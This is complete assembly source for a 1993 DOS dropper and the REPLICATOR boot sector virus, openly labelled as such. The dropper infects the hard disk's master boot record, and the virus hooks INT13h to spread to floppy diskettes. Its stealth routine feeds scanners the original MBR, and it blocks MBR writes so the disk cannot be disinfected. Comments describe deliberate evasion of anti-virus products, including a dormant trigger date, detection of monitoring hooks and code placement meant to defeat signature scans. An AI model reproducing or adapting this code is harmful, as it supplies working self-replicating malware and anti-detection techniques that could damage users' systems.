;**********************************************************************************************
;*                                                                                            *
;*  FILE:     DROP_REP.ASM (c) 1993                                                           *
;*  PURPOSE:  Dropper containing REPLICATOR boot sector virus                                 *
;*  AUTHOR:   Willoughby    DATE: 04/19/93                                                    *
;*                                                                                            *
;**********************************************************************************************
;
;------------------------------------------ EQUATES -------------------------------------------
;
AT_TAG                  EQU     0FC
BAD_TAG                 EQU     0BAD
BIOS13_OFFSET           EQU     004C
BIOS13_SEGMENT          EQU     004E
BIOS40_SEGMENT          EQU     0103
BPB_NUM_SECT            EQU     013
CLEAR                   EQU     00
INF_TAG1                EQU     0ABCD
INF_TAG2                EQU     0CDEF
MEM_SIZE                EQU     0413
MOTOR_ON                EQU     043F
PARTITION_OFFSET        EQU     01BE
ROM_SEGMENT             EQU     0F0
SET                     EQU     0BB
SYS_ID_OFFSET           EQU     0FFFE
SYS_ID_SEGMENT          EQU     0F000
;
;---------------------------------------- MAIN PROGRAM ----------------------------------------
;
CODE    SEGMENT
;
;----------------------------
;Dropper for REPLICATOR virus
;----------------------------
; 
DROPPER: 
;                                                                  
;Check system type to determine if the INT1Ah read-real-time-clock function is supported (AT 
;or better).  If not, skip the trigger date check/storage process and store "BAD" tag for 
;the benefit of the REPLICATOR infection analysis program (a future release).  
;
        MOV AX,SYS_ID_SEGMENT           
        MOV DS,AX                               ;Set DS to ROM segment.
        CMP B[SYS_ID_OFFSET],AT_TAG             ;Check system ID byte for AT system tag.
        PUSH CS
        POP DS                                  ;Set DS to dropper code segment.
        JE >D1                                  ;If AT, check date and store before infection.
        MOV DROP_MODAY,BAD_TAG                  ;If not, store hard drive drop date "BAD" tag
                                                ;in VIRUS_DIR. 
        JMP >D3                                 ;Then continue infection process.
;                                            
;Determine if date is equal to or greater than preselected infection date.  This allows the 
;dropper program to pass initial anti-viral scanning/activity monitoring by remaining dormant 
;until a later date.  Also, store month, day and year of pending fixed disk infection in 
;VIRUS_DIR. 
;
D1:
        MOV AH,04                               ;Set read-date function.                   
        INT 01A                                 ;BIOS read-clock interrupt.                 
        MOV DROP_YEAR,CX                        ;Store infection year in VIRUS_DIR.
        MOV DROP_MODAY,DX                       ;Store month and day in VIRUS_DIR.
        CMP CX,01993                            ;Compare system year with 1993 trigger year
                                                ;(CH=century, CL=year, both in BCD).
        JA >D2                                  ;If year>trigger year, proceed w/infection.
        JB >D5                                  ;If year<trigger year, exit and do not infect.
        CMP DX,0101                             ;Compare system date w/Jan. 1st (DH=month, 
                                                ;DL=day, both in BCD).  The date Jan. 1
                                                ;effectively disables this function.
        JB >D5                                  ;If the current date is not => the trigger 
                                                ;date, don't infect.            
;
;Store time of pending fixed disk infection in VIRUS_DIR.
;
D2:
        MOV AH,02                               ;Select read-time function.
        INT 01A                                 ;BIOS read-clock interrupt.
        MOV DROP_TIME,CX                        ;Store infection hour and minute in VIRUS_DIR.
;
;Determine if an anti-viral program is monitoring viral activity via INT40h.  If so, don't 
;infect.   
;
D3:
        PUSH DS                                 ;Preserve DS.                   
        XOR AX,AX
        MOV DS,AX                               ;Zero DS to point to BIOS data table.
        CMP B[BIOS40_SEGMENT],ROM_SEGMENT       ;Has INT40h been stolen from BIOS ROM by an
                                                ;anti-virus program?
        POP DS                                  ;Restore DS.                     
        JB >D5                                  ;If INT40h has been stolen, do not attempt
                                                ;infection. 
;
;Load MBR.
;
        PUSH CS                                                               
        POP ES                                  ;Set ES to dropper code segment.             
        MOV AX,0201                             ;Select read-1-sector function.               
        MOV BX,MBR_BUFFER                       ;Set disk I/O buffer offset.               
        MOV CX,0001                             ;Track 0, sector 1.                        
        MOV DX,0080                             ;Head 0, fixed disk 1.                     
        INT 013                                 ;Read MBR.                                  
        JB >D5                                  ;Exit if flag=failure.                  
;
;Check MBR for infection.
;
        CMP W[BX+OFFSET INFECT_TAG1-0200],INF_TAG1      ;Check for VIRUS_BOOT infection tag.
        JE >D5                                          ;If infected then exit.
;
;Check fixed disk for an unused first track (head 0, cylinder 0) to avoid damaging any FAT 
;which might be present in that area.  This is accomplished by checking the partition table 
;value which holds the number of the starting head of the first partition.  If this number is 
;equal to or greater than 01, the first track is not in use.
;
        CMP B[BX+PARTITION_OFFSET+1],01         ;Check for unused track on fixed disk by
                                                ;checking partition table data.
        JB >D5                                  ;If in use, exit to avoid damage to FAT.    
;
;Increment hard disk infection counter for pending infection.
;
        INC W[OFFSET HARD_COUNT]
;
;Write original MBR to its new location.  Also, determine if VIRUS_DIR is present on the fixed 
;disk.  If so, don't write VIRUS_DIR to disk so that the previous infection counts and dates 
;are retained.  
;
        MOV AX,0201                                     ;Select read-1-sector function.      
        MOV BX,MBR_BUFFER+0200                          ;Set disk I/O buffer offset.       
        MOV CL,09                                       ;Track 0, sector 9.    
        INT 013                                         ;Read VIRUS_DIR sector.
        JB >D5                                          ;Exit if flag=failure.
        CMP W[BX+OFFSET INFECT_TAG2-0400],INF_TAG2      ;Check for VIRUS_DIR infection tag.
        MOV AX,0302                                     ;Select write-2-sectors function.  
        MOV BX,VIRUS_DIR                                ;Specify VIRUS_DIR buffer offset.
        JNE >D4                                         ;If VIRUS_DIR is not present, write
                                                        ;both VIRUS_DIR and MBR.
        MOV AX,0301                                     ;If present, select write-1-sector
                                                        ;function.
        MOV BX,MBR_BUFFER                               ;Specify MBR buffer address.
        MOV CL,0A                                       ;Specify relocation sector for MBR. 
D4:
        INT 013                                         ;Write to specified sector(s).
        JB >D5                                          ;Exit if flag=failure.             
;
;Copy partition table data to virus.
;
        MOV SI,MBR_BUFFER+PARTITION_OFFSET      ;Set source offset.             
        MOV DI,VIRUS_BOOT+PARTITION_OFFSET      ;Set destination offset.        
        MOV CL,021                              ;Set repetition count (number of words) for
                                                ;partition table move.          
        CLD                                     ;Clear direction flag (fwd).   
        REP MOVSW                               ;Move partition table to virus.   
;
;Write virus to MBR.
;
        MOV AX,0301                             ;Select write-1-sector function.         
        MOV BX,VIRUS_BOOT                       ;Set disk I/O buffer offset.            
        MOV CL,01                               ;Track 0, sector 1.                     
        INT 013                                 ;Write virus with attached partition table
                                                ;to MBR.  
;
;Terminate dropper.
;
D5:
        MOV AX,04C00                            ;Select terminate w/return code function. 
        INT 021                                 ;Terminate dropper.
;
        DB  86  DUP 00                          ;Pad bytes to avoid possible DMA I/O errors.
;
;**********************************************************************************************
;*                                                                                            *
;*  REPLICATOR boot sector virus                                                              *
;*                                                                                            *
;**********************************************************************************************
;
VIRUS_BOOT:
;
        JMP >B1                                 ;Jump over BPB data to virus entry point.     
;
BPB_START:
;
        DB  60 DUP 00                           ;Reserve space for diskette BPB data.
;
BPB_END:
;
;------------
;Boot routine
;------------
;
;Set location of stack.
;
B1:                                    
        XOR AX,AX                               ;Zero AX.                              
        MOV DS,AX                               ;Zero DS.                  
        CLI                                     ;Disable interrupts.                  
        MOV SS,AX                               ;Zero SS.                 
        MOV AX,07C00                            ;Load location of stack to AX.          
        MOV SP,AX                               ;Set SP=7C00h.                 
        STI                                     ;Enable interrupts.                    
        PUSH DS                                 ;Store return address of boot record to be
        PUSH AX                                 ;popped from the stack when VIRUS_BOOT
                                                ;returns to it (0000:7C00h).
;
;Read INT13h segment and offset from BIOS data table and store within VIRUS_BOOT.
;
        MOV AX,W[BIOS13_OFFSET]                 ;Load BIOS INT13h vector offset stored at
                                                ;0000:004Ch.   
        MOV W[OFFSET BIOS_OFFSET+07A00],AX      ;Store BIOS INT13h offset value in virus data 
                                                ;area.     
        MOV CL,06                               ;Set CL for virus segment shift. Location of  
                                                ;this operation chosen to defeat anti-viral
                                                ;generic code-segment scans.
        MOV AX,W[BIOS13_SEGMENT]                ;Load BIOS INT13h vector segment stored at
                                                ;0000:004Eh.  
        MOV W[OFFSET BIOS_SEGMENT+07A00],AX     ;Store BIOS INT13h segment value in virus data
                                                ;area.    
;
;Calculate virus upper memory segment value and store within VIRUS_BOOT.
;
        MOV BX,MEM_SIZE                         ;Load BX with address 0413h. This defeats
                                                ;anti-viral searches for 0413h MOV operations.  
        MOV AX,W[BX]                            ;Load memory size (in KB) stored at 0000:0413h.
        DEC AX                                  ;Calculate value for 2KB reduction of
        DEC AX                                  ;conventional memory.        
        SHL AX,CL                               ;Calculate virus segment.      
        MOV W[OFFSET REENTRY_SEGMENT+07A00],AX  ;Store virus segment value in virus data area.  
        MOV ES,AX                               ;Store in ES to be used to move virus to top of
                                                ;conventional memory.
;
;Move VIRUS_BOOT from 0000:7C00h to top of memory - 2KB.
;
        MOV SI,07C00                            ;Set source offset address for virus move.     
        XOR DI,DI                               ;Set destination offset address to 0000h.       
        MOV CX,0100                             ;Set repetition count (number of words) for
                                                ;move. 
        CLD                                     ;Clear direction flag (fwd).            
        REP MOVSW                               ;Move virus from DS:7C00h to ES:0000h.         
        CS JMP D[OFFSET REENTRY_OFFSET+07A00]   ;Jump to self in new location via stored
                                                ;address.         
;
;Load VIRUS_DIR and original boot sector/MBR to top of memory - 1.5KB.
;
NEW_LOCATION:
;
        PUSH CS                                                                
        POP DS                                  ;Set DS=CS.                            
        MOV AX,0202                             ;Select read-2-sectors function.        
        MOV BX,0200                             ;Set disk I/O buffer offset.        
        MOV CL,B[OFFSET SECTOR-0200]            ;VIRUS_DIR sector determined by value stored in
                                                ;VIRUS_BOOT.
        CMP CL,09                               ;Test for hard drive (HD) boot.         
        JE >B2                                  ;Yes, booted from HD.                 
        INC DH                                  ;Select head 1, floppy drive DL.       
B2:                                                                         
        INT 013                                 ;Read VIRUS_DIR and original boot record.
        JNB >B3                                 ;Continue if flag=success.
        JMP B5                                  ;Exit if flag=failure.
;
;Copy original boot sector/MBR down to 0000:7C00h for later execution.     
;
B3:
        XOR AX,AX                               ;Zero AX.                             
        MOV ES,AX                               ;Zero ES (destination segment value).         
        MOV SI,0400                             ;Set source offset address for virus move.    
        MOV DI,07C00                            ;Set destination offset address for move.     
        MOV CX,0100                             ;Set repetition count (# of words) for move.
        CLD                                     ;Clear direction flag (fwd).          
        REP MOVSW                               ;Copy original boot record to 0000:7C00h.     
;
;Determine if the virus is already installed on the system in the memory above.  If it is, in
;order to prevent multiple installations of the virus in memory and the problems that this can
;cause, the virus will be removed from memory.  This will be done by restoring the BIOS data
;table values that it has changed to their original, pre-infection values. 
;
        CMP W[OFFSET INFECT_TAG1+0600],INF_TAG1 ;Check for presence of virus above us.
        JNE >B4                                 ;If it's not there, exit removal routine.
        MOV AX,W[OFFSET BIOS_OFFSET+0600]       ;Get the pre-infection INT13h offset value from
                                                ;the virus installed in memory.
        PUSH AX                                 ;Save that value on the stack.
        MOV AX,W[OFFSET BIOS_SEGMENT+0600]      ;Get the pre-infection INT13h segment value.
        PUSH DS                                 ;Preserve DS.
        XOR BX,BX                               ;Zero BX.
        MOV DS,BX                               ;Zero DS.
        MOV W[BIOS13_SEGMENT],AX                ;Restore BIOS data table to pre-infection
                                                ;segment value.
        POP AX                                  ;Pop pre-infection offset value from stack.
        MOV W[BIOS13_OFFSET],AX                 ;Restore BIOS data table to pre-infection
                                                ;offset value.
        MOV BX,MEM_SIZE                         ;Move data table address for conventional
                                                ;memory size into BX.
        ADD W[BX],02                            ;Increase memory size value by 2KB to restore 
                                                ;it to pre-infection value.
        POP DS                                  ;Restore DS.
        JMP >B5                                 ;Exit without installing virus in memory.
;
;Test for HD boot and, if true, install virus in memory.
;
B4:
        CMP DL,080                              ;Booted from HD?        
        JE >B6                                  ;If so, install virus and exit.
;
;Must be booting from floppy, so load MBR to top of memory - 1KB.          
;
        PUSH CS                                                                
        POP ES                                  ;Set ES=CS.                             
        MOV AX,0201                             ;Select read-1-sector function.         
        MOV BX,0400                             ;Set disk I/O buffer offset.           
        MOV CL,01                               ;Track 0, sector 1.                   
        MOV DX,0080                             ;Head 0, HD 1.                       
        INT 013                                 ;Read MBR.                           
        JB >B5                                  ;Exit if flag=failure and do not steal INT13h.
;
;Check MBR for infection.
;              
        CMP W[BX+OFFSET INFECT_TAG1-0200],INF_TAG1  ;Check MBR for infection tag.
        JE >B5                                      ;If infected, exit and do not steal INT13h.
;
;Check fixed disk for an unused first track (head 0, cylinder 0) to avoid damaging any FAT 
;which might be present in that area.  
;
        CMP B[BX+PARTITION_OFFSET+1],01         ;Check for unused track on HD by checking
                                                ;partition table data (start head => 1).       
        JB >B5                                  ;If first track is in use, exit to avoid
                                                ;FAT damage and do not steal INT13h vector.   
;
;Increment hard disk infection counter for pending infection.
;
        INC W[OFFSET HARD_COUNT-0200]
;
;Write VIRUS_DIR and original MBR to fixed disk sectors 09h and 0Ah respectively.
;
        MOV AX,0302                             ;Select write-2-sectors function. 
        MOV BX,0200                             ;Set disk I/O buffer offset.
        MOV CL,09                               ;Track 0, sector 9.
        MOV B[OFFSET SECTOR-0200],CL            ;Store destination sector number in VIRUS_BOOT.
        INT 013                                 ;Move VIRUS_DIR to sector 09h and original MBR
                                                ;to sector 0Ah.
        JB >B5                                  ;Exit if flag=failure and do not steal INT13h.
;
;Copy partition table data to VIRUS_BOOT.
;
        MOV SI,PARTITION_OFFSET+0400            ;Set source offset.                    
        MOV DI,PARTITION_OFFSET                 ;Set destination offset.                
        MOV CL,021                              ;Set repetition count (# of words) move.
        CLD                                     ;Clear direction flag (fwd).            
        REP MOVSW                               ;Move partition table to virus.         
;
;Write VIRUS_BOOT to MBR and exit without installing virus in memory.  Subsequent HD boot will
;do this. 
; 
        MOV AX,0301                             ;Select write-1-sector function.          
        XOR BX,BX                               ;Set disk I/O buffer offset.            
        MOV CL,01                               ;Track 0, sector 1.                     
        INT 013                                 ;Write virus w/attached partition table to MBR.
B5:
        XOR DX,DX                               ;Restore DX back to value at floppy boot
                                                ;(head 0, drive 0).  
        RETF                                    ;Exit, do not steal INT13h or reduce mem. size.
                                                ;Return to boot sector code at 0000:7C00h.
;
;Steal BIOS INT13h vector and reduce memory size to install virus as TSR.
;
B6:
        MOV BX,W[OFFSET REENTRY_SEGMENT-0200]           ;Load VIRUS_DIR segment value to BX.
        XOR AX,AX                                       ;Zero AX.                       
        MOV DS,AX                                       ;Zero DS.                            
        MOV W[BIOS13_SEGMENT],BX                        ;Point INT13h vector to VIRUS_DIR
                                                        ;segment.         
        MOV W[BIOS13_OFFSET],OFFSET VIRUS_INT-0200      ;Point INT13h vector to VIRUS_INT
                                                        ;INT13h handler offset in VIRUS_DIR.
        MOV BX,MEM_SIZE                                 ;Load BIOS data table address for
                                                        ;memory size to BX.    
        SUB W[BX],02                                    ;Reduce memory by 2KB to protect virus
                                                        ;area from being overwritten by other 
                                                        ;programs.
        RETF                                            ;Return to boot sector code at
                                                        ;0000:7C00h.
;
;Reserve storage locations for virus data and preset some known values.
;
BIOS_OFFSET     DW  ?                           ;BIOS INT13 offset.                     
BIOS_SEGMENT    DW  ?                           ;BIOS INT13 segment.                    
REENTRY_OFFSET  DW  NEW_LOCATION-0200           ;Virus reentry offset.                  
REENTRY_SEGMENT DW  ?                           ;Virus reentry segment.                
INFECT_TAG1     DW  INF_TAG1                    ;Infection tag for VIRUS_BOOT.
SECTOR          DB  09                          ;Sector # containing VIRUS_DIR.     
;
VIRUS_BOOT_END:
;
;Reserve end-of-sector text area and establish valid boot record tag.     
;
                DB 195  DUP 00                  ;End-of-sector pad bytes.
                DB 055,0AA                      ;Boot record tag.
;
SECTOR_END:
;
;End of boot sector/MBR viral code. 
;----------------------------------------------------------------------------------------------
;Start of directory sector viral code.
;
VIRUS_DIR:
;
;Create four empty root directory entries at the beginning of the sector.
;
                DB 128  DUP 00
;
;--------------
;INT13h Handler         
;--------------
;
VIRUS_INT:
;
        CMP DL,080                              ;Hard drive I/O?
        JNE >F1                                 ;No, exit to floppy test routine.    
;
;Stealth routine to return original, uninfected MBR to any anti-viral scan program.  Also,
;prevents writes to the MBR to prevent disinfection of the fixed disk while the virus is
;active in memory.
;
        CMP CX,0001                             ;Track 0, sector 1?
        JNE >U1                                 ;If not, no need for the stealth routine.  
                                                ;Instead, jump to infect. count. update.
        CMP DH,00                               ;Head 0?
        JNE >E2                                 ;If not, exit stealth routine.  
        CMP AH,03                               ;Write sector?                       
        JE >S1                                  ;Yes, simulate I/O.                     
        PUSH CX                                 ;Preserve CX (track/sector #).          
        MOV CL,0A                               ;Redirect I/O to sector 0Ah, the new location 
                                                ;of the original MBR.                        
        PUSHF                                                                  
        CS CALL D[OFFSET BIOS_OFFSET-0200]      ;Send scan program original MBR    
                                                ;instead of infected MBR.    
        POP CX                                  ;Restore original track/sector value requested
                                                ;the calling routine.  Anti-viral scanner will
                                                ;monitor the contents of CL upon return.     
S1:                                                                          
        XOR AH,AH                               ;Zero AH to simulate return value of
                                                ;successful I/O.   
        CLC                                     ;Clear carry flag to simulate successful I/O
                                                ;to calling routine.         
        RETF 2                                  ;Return to calling routine.            
;
;Infection counter update routine writes VIRUS_DIR containing the lastest floppy infection
;counter value to the hard drive only if there has been a diskette infection since the last 
;hard drive access.   
;
U1:
        PUSH DS                                 ;Preserve DS.
        PUSH CS
        POP DS                                  ;Set DS=CS
        CMP B[OFFSET UPDATE_FLAG-0200],SET      ;Floppy infected since last HD access?
        JNE >U2                                 ;No, exit counter update routine.
        MOV B[OFFSET UPDATE_FLAG-0200],CLEAR    ;Yes, clear floppy infect flag.
        PUSH ES                                 ;Preserve ES.
        PUSH CS
        POP ES                                  ;Set ES=CS
        PUSH AX                                 ;Preserve registers.
        PUSH BX
        PUSH CX
        PUSH DX
        MOV AX,0301                             ;Select write-1-sector function.
        MOV BX,0200                             ;Set disk I/O buffer start address.
        MOV CX,0009                             ;Specify track 0, sector 9.
        MOV DH,00                               ;Specify head 0.
        PUSHF
        CS CALL D[OFFSET BIOS_OFFSET-0200]      ;Save VIRUS_DIR w/new infect. count to HD.
        POP DX                                  ;Restore registers
        POP CX                                 
        POP BX
        POP AX
        POP ES
U2:
        POP DS
        JMP >E2                                 ;Exit to handler exit.
;
;Check the INT13h register values for drive A or B read or write request.  This prevents
;problems caused by the virus infecting a diskette during format.  Also, by limiting infection
;attempts to the first two floppy drives, it avoids the problems it would cause to a tape 
;backup system emulating a third or fourth floppy drive.  
;
F1:
        PUSH DS                                 ;Preserve DS.                           
        PUSH AX                                 ;Preserve AX.                           
        CMP DL,01                               ;Floppy I/O (A or B)?                 
        JA >E1                                  ;No, don't infect.                    
        CMP AH,02                               ;Check for read function.             
        JB >E1                                  ;Exit if below read function.         
        CMP AH,03                               ;Check for write function.            
        JA >E1                                  ;Exit if above write function.       
;
;Check diskette motor status to limit infection attempt to first INT13h call thereby preventing
;suspicious floppy drive noises.  
;
        XOR AX,AX                               ;Zero AX.                             
        MOV DS,AX                               ;Zero DS.                  
        MOV AL,DL                               ;Move motor-on test bit into AL.      
        INC AL                                  ;Position bit for floppy 'DL'.          
        TEST B[MOTOR_ON],AL                     ;Test for floppy motor on.             
        JNE >E1                                 ;Yes, don't infect.                    
;
;Check for presence of TSR anti-viral monitoring program to avoid detection of boot sector 
;write by virus.  If present, don't attempt infection.  
;
        CMP B[BIOS40_SEGMENT],ROM_SEGMENT       ;Has INT40h been stolen from BIOS ROM by an
                                                ;anti-virus program?
        JB >E1                                  ;If so, do not attempt infection.  
;
;Infect floppy.
;
        POP AX                                  ;Restore AX.
        POP DS                                  ;Restore DS.
        PUSHF
        CS CALL D[OFFSET BIOS_OFFSET-0200]      ;Give calling routine what it wants. 
        PUSHF                                   ;Preserve flags.               
        CALL >F2                                ;Then attempt infection.        
        POPF                                    ;Restore flags to hide I/O errors.             
        RETF 2                                  ;Return to calling routine.     
;
;Jump to BIOS.
;
E1:
        POP AX                                  ;Restore AX.
        POP DS                                  ;Restore DS.
E2:
        CS JMP D[OFFSET BIOS_OFFSET-0200]       ;Jump through BIOS to calling routine.
;
;Diskette infection routine.
;
F2:
        PUSH AX                                 ;Preserve all registers.  
        PUSH BX                                                                
        PUSH CX                                                                
        PUSH DX                                                                
        PUSH DS                                                                
        PUSH ES                                                                
        PUSH SI                                                                
        PUSH DI                                                                
;
;Check system type to determine if the INT1Ah read-real-time-clock function is supported (AT 
;or better).  If not, skip the date check/storage process and store floppy infection "BAD"
;date tag in VIRUS_DIR. 
;
        MOV AX,SYS_ID_SEGMENT
        MOV DS,AX                               ;Set DS to ROM offset.
        CMP B[SYS_ID_OFFSET],AT_TAG             ;Check system ID byte for AT system tag.
        PUSH CS
        POP DS                                  ;Set DS to point to dropper segment.
        JE >F3                                  ;If AT, check date and store before infection.
        MOV W[OFFSET FLOPPY_MODAY-0200],BAD_TAG ;Store date "BAD" tag in VIRUS_DIR. 
        JMP >F4                                 ;Then continue infection process.
;                                            
;Store month, day and year of pending floppy diskette infection in VIRUS_DIR. 
;
F3:
        PUSH DX
        MOV AH,04                               ;Set read-date function.        
        INT 01A                                 ;BIOS read-clock interrupt.     
        MOV W[OFFSET FLOPPY_YEAR-0200],CX       ;Store infection year in VIRUS_DIR.
        MOV W[OFFSET FLOPPY_MODAY-0200],DX      ;Store month and day in VIRUS_DIR.
;
;Store time of pending floppy diskette infection in VIRUS_DIR.
;
        MOV AH,02                               ;Select read-time function.
        INT 01A                                 ;BIOS read-clock interrupt.
        MOV W[OFFSET FLOPPY_TIME-0200],CX       ;Store infection hour and minute in VIRUS_DIR.
        POP DX
;
;Load diskette boot sector to top of memory - 1KB.
;
F4:
        PUSH CS                                                                
        POP ES                                  ;Set ES=CS.                             
        MOV AX,0201                             ;Select read-1-sector function.           
        MOV BX,0400                             ;Set disk I/O buffer offset.            
        MOV CX,0001                             ;Track 0, sector 1.                    
        MOV DH,00                               ;Head 0, drive DL.                    
        PUSHF                                                                
        CALL D[OFFSET BIOS_OFFSET-0200]         ;Read drive DL boot sector to buffer by   
                                                ;calling INT13h routine in BIOS ROM.  
        JNB >F5                                 ;Proceed with infection if flag=success.
        JMP F7                                  ;Otherwise, exit.
;
;Check diskette boot sector for infection.
;
F5:
        CMP W[BX+OFFSET INFECT_TAG1-0200],INF_TAG1      ;Check for VIRUS_BOOT infection tag.
        JE >F7                                          ;If infected, then exit.
;
;Determine diskette type from BPB data to allow VIRUS_DIR and original boot sector to be 
;written to the last two root directory sectors.  This maximizes the number of files that can 
;be stored on the diskette after infection.  Also, detect non-standard formats and do not 
;infect to prevent damage. 
;
        MOV CL,02                               ;VIRUS_DIR sector for 360K.          
        MOV AX,W[BX+BPB_NUM_SECT]               ;Load # sect. on floppy from BPB.       
        CMP AX,02D0                             ;Check for # sectors on 360K.           
        JE >F6                                  ;Exit if 360K floppy.                   
        MOV CL,04                               ;VIRUS_DIR sector for 720K.          
        CMP AX,05A0                             ;Check for # sectors on 720K.          
        JE >F6                                  ;Exit if 720K floppy.                   
        MOV CL,0D                               ;VIRUS_DIR sector for 1.2M.          
        CMP AX,0960                             ;Check for # sectors on 1.2M.           
        JE >F6                                  ;Exit if 1.2M floppy.                   
        MOV CL,0E                               ;VIRUS_DIR sector for 1.44M.         
        CMP AX,0B40                             ;Check for # sectors on 1.44M.         
        JE >F6                                  ;Exit if 1.44M floppy.                
        JMP >F7                                 ;Non-standard disk format, exit to avoid
                                                ;damage.
;
;Load the first of the two root directory sectors that will be used to store the VIRUS_DIR 
;and original boot sector to top of memory - 0.5KB.  
;
F6: 
        MOV B[OFFSET SECTOR-0200],CL            ;Store destination sector # in VIRUS_BOOT. 
        MOV AX,0201                             ;Select read sector function.           
        MOV BX,0600                             ;Set disk I/O buffer offset.            
        INC DH                                  ;Head 1, drive DL.                      
        PUSHF                                                                   
        CALL D[OFFSET BIOS_OFFSET-0200]         ;Load destination sector.              
        JB >F7                                  ;Exit if flag=failure.               
;                                       
;Confirm that the directory sector chosen to be the future location of VIRUS_DIR is empty
;before attempting infection.  This prevents the loss of files which would result from
;the overwriting of root directory entries by the virus. 
;
        CMP B[BX],00                            ;Empty root directory entry?
        JNE >F7                                 ;No, so exit and don't infect disk.
;
;Copy the original boot sector's BPB to VIRUS_BOOT to allow functional infection of any 
;diskette type.   
;
        MOV SI,BPB_START+0200                   ;Set source offset.                     
        MOV DI,BPB_START-0200                   ;Set destination offset.               
        MOV CL,BPB_END-BPB_START                ;Set repetition count (# of bytes) for move. 
        CLD                                     ;Clear direction flag (fwd).            
        REP MOVSB                               ;Move BPB to virus to allow functional 
                                                ;infection of any diskette format.         
;
;Copy original boot sector end-of-sector text to VIRUS_BOOT to prevent easily visible changes 
;to boot sector.  
;
        MOV SI,VIRUS_BOOT_END+0200              ;Set source offset.            
        MOV DI,VIRUS_BOOT_END-0200              ;Set destination offset.       
        MOV CL,SECTOR_END-VIRUS_BOOT_END        ;Set repetition count (number of bytes) for 
                                                ;text move.  
        CLD                                     ;Clear direction flag (fwd).    
        REP MOVSB                               ;Move end-of-sector text to virus to prevent
                                                ;easily visible change to boot sector.       
;
;Write VIRUS_BOOT to diskette boot sector.
;
        MOV AX,0301                             ;Select write-1-sector function.        
        XOR BX,BX                               ;Set disk I/O buffer offset.          
        MOV CL,01                               ;Track 0, sector 1.                     
        DEC DH                                  ;Head 0, drive DL.                      
        PUSHF                                                                   
        CALL D[OFFSET BIOS_OFFSET-0200]         ;Write infected boot sector.            
        JB >F7                                  ;Exit if flag=failure.                  
;
;Increment floppy infection count.
;
        INC W[OFFSET FLOPPY_COUNT-0200]
;
;Clear diskette infection flag.
;
        MOV B[OFFSET UPDATE_FLAG-0200],CLEAR
;
;Write VIRUS_DIR and original boot sector to appropriate sectors.
;
        MOV AX,0302                             ;Select write-2-sectors function.     
        MOV BX,0200                             ;Set disk I/O buffer offset.          
        MOV CL,B[OFFSET SECTOR-0200]            ;Track 0, sector stored at 0189h.       
        INC DH                                  ;Head 1, drive DL.             
        PUSHF                                                                   
        CALL D[OFFSET BIOS_OFFSET-0200]         ;Relocate boot sector.         
;
;Set diskette infection flag.
;
        MOV B[OFFSET UPDATE_FLAG-0200],SET
;
;Exit diskette infection routine.
;
F7:
        POP DI                                  ;Restore all registers.               
        POP SI                                                                 
        POP ES                                                                 
        POP DS                                                                 
        POP DX                                                                 
        POP CX                                                                 
        POP BX                                                                 
        POP AX                                                                 
        RET                                     ;Return to infection routine exit.     
;
;Virus data area.
;
HARD_COUNT      DW  ?                           ;Number of HD infections since drop.
DROP_MODAY      DW  ?                           ;Month and day of HD drop.
DROP_YEAR       DW  ?                           ;Year of HD drop.
DROP_TIME       DW  ?                           ;Time of HD drop.
FLOPPY_COUNT    DW  ?                           ;Number of floppy infections since drop.
FLOPPY_MODAY    DW  ?                           ;Month and day of last floppy infection.
FLOPPY_YEAR     DW  ?                           ;Year of last floppy infection.
FLOPPY_TIME     DW  ?                           ;Time of last floppy infection.
INFECT_TAG2     DW  INF_TAG2                    ;Infection tag for VIRUS_DIR.
UPDATE_FLAG     DB  CLEAR                       ;Flag indicating floppy infection since last
                                                ;HD access.
;
                DB 3    DUP 00                  ;End-of-sector pad bytes.
;
;End of directory sector viral code.
;----------------------------------------------------------------------------------------------
;Start of MBR disk buffer.
;
MBR_BUFFER:
;
;----------------------------------------------------------------------------------------------
;
CODE    ENDS

